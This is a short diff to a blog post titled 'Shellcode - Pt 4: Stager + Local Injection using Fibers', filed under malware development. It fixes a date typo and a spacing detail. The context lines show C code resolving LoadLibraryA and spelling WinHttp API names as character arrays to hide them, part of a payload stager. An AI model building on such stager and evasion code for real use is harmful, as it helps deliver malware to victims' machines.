@@ -2,7 +2,7 @@
 title: "Shellcode - Pt 4: Stager + Local Injection using Fibers"
 description: In this guide, we will explore how to develop a Stager & Local Injector, using Fibers for payload execution. To fetch the payload from a web server, we will make use of the WinHttp library. Before diving into specific implementations, it is essential to understand the components and the overall structure of the project.
 author: Oblivion
-date: 22024-05-26 11:33:00 +0800
+date: 2024-05-26 11:33:00 +0800
 categories: [Malware Development]
 tags: []
 pin: false
@@ -182,7 +182,7 @@ void InitInstance( _Out_ PINSTANCE pInstance){
   pInstance->Api.pLoadLibraryA          = LdrFuncAddr(pInstance->Modules.Kernel32, cLoadLibraryA);
   /*--------------------------[ WinHttp ]--------------------------*/
 
-  CHAR cWinHttp[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', '.', 'd', 'l', 'l', 0};
+  CHAR cWinHttp[] = { 'W', 'i', 'n', 'H', 't', 't', 'p', '.', 'd', 'l', 'l', 0 };
 
   CHAR cWinHttpOpen[]            = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'O', 'p', 'e', 'n', 0 };
   CHAR cWinHttpConnect[]         = { 'W', 'i', 'n', 'H', 't', 't', 'p', 'C', 'o', 'n', 'n', 'e', 'c', 't', 0 };
